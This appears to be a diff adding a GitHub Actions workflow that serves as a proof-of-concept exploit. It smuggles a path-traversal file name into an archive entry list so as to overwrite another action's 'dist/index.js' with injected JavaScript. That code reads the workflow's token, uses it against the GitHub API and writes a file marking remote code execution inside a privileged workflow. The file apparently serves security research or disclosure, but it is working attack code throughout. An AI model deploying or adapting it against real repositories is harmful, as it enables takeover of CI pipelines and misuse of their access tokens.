@@ -1,0 +1,27 @@
+name: pr
+
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      pull-requests: write
+    steps:
+      - uses: actions/checkout@v4
+      - uses: ./.github/actions/gabzip
+        env:
+          ART_NAME: pr-comment-body.txt
+          ENTRIES_JSON: |
+            [
+              {
+                "name": "pr-comment-body.txt",
+                "content": "attacker-controlled comment body\n"
+              },
+              {
+                "name": "x/../../../_actions/peter-evans/create-or-update-comment/v5/dist/index.js",
+                "content": "const https = require('https');\nconsole.log('HIJACKED_PETER_EVANS_ACTION job=' + process.env.GITHUB_JOB + ' repo=' + process.env.GITHUB_REPOSITORY);\nconsole.log('TOKEN_PRESENT=' + (process.env.INPUT_TOKEN ? 'yes' : 'no'));\nconst req = https.request('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/pulls?per_page=1', {headers: {authorization: 'Bearer ' + (process.env.INPUT_TOKEN || ''), 'user-agent': 'gab-poc', accept: 'application/vnd.github+json'}}, r => { console.log('TOKEN_API_STATUS=' + r.statusCode); r.resume(); });\nreq.on('error', e => console.log('API_ERR ' + e.message));\nreq.end();\nrequire('fs').writeFileSync('/tmp/hijacked-by-artifact.txt', 'RCE inside privileged workflow_run\\n');\n"
+              }
+            ]
